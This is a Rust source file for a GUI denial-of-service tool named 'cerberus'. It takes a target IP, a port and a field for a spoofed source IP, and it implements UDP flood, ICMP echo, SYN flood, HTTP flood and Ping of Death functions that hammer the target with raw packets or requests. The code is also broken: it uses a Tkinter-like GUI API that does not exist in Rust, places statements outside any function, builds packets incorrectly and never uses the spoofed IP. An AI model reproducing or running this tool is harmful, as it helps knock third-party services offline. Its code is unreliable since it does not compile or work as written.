use std::thread;
use std::time::Duration;
use std::sync::mpsc;
use std::sync::Arc;
use std::sync::Mutex;

use reqwest;
use pnet::packet::Packet;
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::packet::icmp::{MutableIcmpPacket, IcmpTypes};
use pnet::packet::ip::{MutableIpPacket, IpNextHeaderProtocols};
use pnet::packet::udp::{MutableUdpPacket, UdpPacket};
use pnet::transport::{transport_channel, TransportChannelType::Layer3};
use pnet::transport::TransportSender;
use pnet::util::checksum;

/*
ASCII art for the tool's name
*/
const CERBERUS_ASCII_ART: &str = "
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXWWWWWWWWWWXXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXl,OWWWWWWWW0;:KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNo. ,kWWWWWWO;. :XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWk. ...dNWWNx...  oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc  ..  ':c;. .'  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc             .  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc                '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc    .'.  .,.    '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWXdoKMWWWWWWWWx.  .;;.   ;:'   cXWWWWWWWWXdxXWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWX0xc. .kWWNXXWWWWNd.  .:.   ;,   :XMWWWNNWWWO. 'lkKNWWWWWWWWWWWWWW
WWWWWWWWWWWXx:..    .:c;,'oNWWWNo..           .:KWWWNx,;clc.    .':xXWWWWWWWWWWW
WWWWWWWWNkc.        .     .;dKWk. .          .. oWXk:.     .        'cONWWWWWWWW
WWWWWWWKo'         ..        ok'   .        ..  .xd.       ..         .l0WWWWWWW
WWWWWWNo:c:,                .:.    ..       .    .c.        .       ';:coXWWWWWW
WWWWWW0,.',.       ..       ;;      ........      ::       ..       .;,.,0WWWWWW
WWWWNO;            .        ',                    ..        .            ;OWWWWW
WWWKl.            '.        ;'                    .,        ...           .lKWWW
WNk'     ..       .         ':.                  .:,         .        .     'kNW
MO.   ...';codxkkxdc.        ,'                  .,        .:lddddol:,....   .kW
WNklc::oOXWWWWWWWWWWXl        ..                ..        :0WWWWWWWWWNKko:;:cxXW
WWWWWNWWWWWWWWWWWWWWWk.        .'              ''        .xWWWWWWWWWWWWWWWXNWWWW
WWWWWWWWWWWWWWWWWWWWW0d,        ,c.          .c:        'oONWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWKl,.      'c'        .c,      ..:0WWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWNNKxc;.   .;;.    .;:.   .,:o0XNWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXko:'.,;'..':,..;lx0NWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXOO0K00kk0XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
MWWWMWWWWWWWWWWMWWWMWWWMWWWWWWWWWWMWWWMWWWWMWWWWWWWWWWMWWWMWWWMWWWMWWWWWWWWWWMWW

";

// Constants for data transfer size
const BYTES_PER_GB: usize = 1024 * 1024 * 1024;

/*
Calculate the packet size based on the ASCII art
*/
const PACKET_SIZE: usize = CERBERUS_ASCII_ART.len();

/*
Set the data transfer size to 1 GB

*/
const DATA_TRANSFER_SIZE: usize = BYTES_PER_GB;

// Create the GUI window
let root = tk::Tk::new();
root.title("DDoS Attack Tool - cerberus");

// Create the input fields for target IP address, spoofed IP address, port number, number of packets, and burst interval
tk::Label::new(&root, "Enter IP Address of The Target").pack();
let target_entry = tk::Entry::new(&root);
target_entry.pack();

tk::Label::new(&root, "Enter The Spoofed IP Address").pack();
let fake_ip_entry = tk::Entry::new(&root);
fake_ip_entry.pack();

tk::Label::new(&root, "Enter The Port Number").pack();
let port_entry = tk::Entry::new(&root);
port_entry.pack();

tk::Label::new(&root, "Enter Number of Packets to Send").pack();
let num_packets_entry = tk::Entry::new(&root);
num_packets_entry.pack();

tk::Label::new(&root, "Enter Burst Interval (in seconds)").pack();
let burst_interval_entry = tk::Entry::new(&root);
burst_interval_entry.pack();

// Create the attack type selection menu
tk::Label::new(&root, "Select Attack Type").pack();
let attack_type_entry = tk::StringVar::new(&root);
attack_type_entry.set("UDP Flood");  // Default attack type

let attack_type_options = [
    "UDP Flood", "ICMP Echo", "SYN Flood", "HTTP Flood", "Ping of Death"
];

let attack_type_menu = tk::OptionMenu::new(&root, &attack_type_entry, &attack_type_options);
attack_type_menu.pack();


// Define the attack functions for each attack type
fn udp_flood_attack(target: String, port: u16, num_packets: u32, burst_interval: f64) {
    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Udp)).unwrap();

    for _ in 0..num_packets {
        let mut udp_buffer = [0u8; 1024];
        let mut udp_packet = MutableUdpPacket::new(&mut udp_buffer).unwrap();
        udp_packet.set_source(1234);
        udp_packet.set_destination(port);
        udp_packet.set_length(udp_packet.packet().len() as u16);
        udp_packet.set_checksum(0);

        let ip_packet = MutableIpPacket::new(udp_packet.packet_mut()).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(ip_packet.packet().len() as u16);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip_packet.set_source("127.0.0.1".parse().unwrap());
        ip_packet.set_destination(target.parse().unwrap());
        ip_packet.set_checksum(checksum(ip_packet.packet()));

        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();

        thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn icmp_echo_attack(target: String, num_packets: u32, burst_interval: f64) {
    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Icmp)).unwrap();

    for _ in 0..num_packets {
        let mut icmp_buffer = [0u8; 1024];
        let mut icmp_packet = MutableIcmpPacket::new(&mut icmp_buffer).unwrap();
        icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
        icmp_packet.set_checksum(0);

        let ip_packet = MutableIpPacket::new(icmp_packet.packet_mut()).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(ip_packet.packet().len() as u16);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
        ip_packet.set_source("127.0.0.1".parse().unwrap());
        ip_packet.set_destination(target.parse().unwrap());
        ip_packet.set_checksum(checksum(ip_packet.packet()));

        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();

        thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn syn_flood_attack(target: String, port: u16, num_packets: u32, burst_interval: f64) {
    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Tcp)).unwrap();

    for _ in 0..num_packets {
        let mut tcp_buffer = [0u8; 1024];
        let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer).unwrap();
        tcp_packet.set_source(1234);
        tcp_packet.set_destination(port);
        tcp_packet.set_flags(TcpFlags::SYN);
        tcp_packet.set_window(1024);
        tcp_packet.set_checksum(0);

        let ip_packet = MutableIpPacket::new(tcp_packet.packet_mut()).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(ip_packet.packet().len() as u16);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_packet.set_source("127.0.0.1".parse().unwrap());
        ip_packet.set_destination(target.parse().unwrap());
        ip_packet.set_checksum(checksum(ip_packet.packet()));

        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();

        thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn http_flood_attack(target: String, port: u16, num_packets: u32, burst_interval: f64) {
    for _ in 0..num_packets {
        let url = format!("http://{}:{}/", target, port);
        let client = reqwest::blocking::Client::new();
        let _ = client.get(&url).send();

        thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn ping_of_death_attack(target: String, num_packets: u32, burst_interval: f64) {
    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Icmp)).unwrap();

    for _ in 0..num_packets {
        let mut icmp_buffer = vec![0u8; 65536];
        let mut icmp_packet = MutableIcmpPacket::new(&mut icmp_buffer).unwrap();
        icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
        icmp_packet.set_payload(&vec![b'X'; 60000]);
        icmp_packet.set_checksum(0);

        let ip_packet = MutableIpPacket::new(icmp_packet.packet_mut()).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(ip_packet.packet().len() as u16);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
        ip_packet.set_source("127.0.0.1".parse().unwrap());
        ip_packet.set_destination(target.parse().unwrap());
        ip_packet.set_checksum(checksum(ip_packet.packet()));

        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();

        thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

// Define the function to start the attack
fn start_attack() {
    let target = target_entry.get();
    let fake_ip = fake_ip_entry.get();
    let port = port_entry.get().parse().unwrap();
    let num_packets = num_packets_entry.get().parse().unwrap();
    let burst_interval = burst_interval_entry.get().parse().unwrap();

    let attack_type = attack_type_entry.get();  // Get the selected attack type from the GUI

    match attack_type.as_str() {
        "UDP Flood" => {
            thread::spawn(move || {
                udp_flood_attack(target, port, num_packets, burst_interval);
            });
        },
        "ICMP Echo" => {
            thread::spawn(move || {
                icmp_echo_attack(target, num_packets, burst_interval);
            });
        },
        "SYN Flood" => {
            thread::spawn(move || {
                syn_flood_attack(target, port, num_packets, burst_interval);
            });
        },
        "HTTP Flood" => {
            thread::spawn(move || {
                http_flood_attack(target, port, num_packets, burst_interval);
            });
        },
        "Ping of Death" => {
            thread::spawn(move || {
                ping_of_death_attack(target, num_packets, burst_interval);
            });
        },
        _ => {
            println!("Invalid attack type selected.");
            return;
        }
    }
}

// Create the start attack button
tk::Button::new(&root, "Start Attack", start_attack).pack();

// Run the GUI main loop
root.mainloop();

